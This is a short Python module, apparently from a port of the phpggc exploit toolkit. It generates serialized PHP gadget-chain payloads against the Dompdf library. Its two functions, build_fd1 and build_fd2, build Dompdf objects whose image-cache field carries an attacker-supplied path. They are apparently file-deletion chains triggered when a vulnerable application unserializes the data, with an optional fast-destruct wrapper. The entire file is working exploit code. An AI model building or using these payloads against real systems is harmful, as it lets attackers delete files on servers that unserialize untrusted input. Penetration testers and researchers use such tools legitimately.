"""Dompdf gadget chains — byte-identical to ambionics/phpggc."""
from __future__ import annotations

from ..platform import maybe_wrap
from ..serialize import php_arr, php_bool, php_int, php_obj, php_str


def build_fd1(remote_path: str, *, fast_destruct: bool = False) -> bytes:
    cpdf = php_obj("Dompdf\\Cpdf", [
        ("imageCache", php_arr([(php_int(0), php_str(remote_path))])),
    ])
    return maybe_wrap(cpdf, fast_destruct)


def build_fd2(remote_path: str, *, fast_destruct: bool = False) -> bytes:
    options = php_obj("Dompdf\\Options", [
        ("debugPng", php_bool(False)),
    ])
    dompdf = php_obj("Dompdf\\Dompdf", [
        ("options", options),
    ])
    adapter = php_obj("Dompdf\\Adapter\\CPDF", [
        ("_dompdf", dompdf),
        ("_image_cache", php_arr([(php_int(0), php_str(remote_path))])),
    ])
    return maybe_wrap(adapter, fast_destruct)
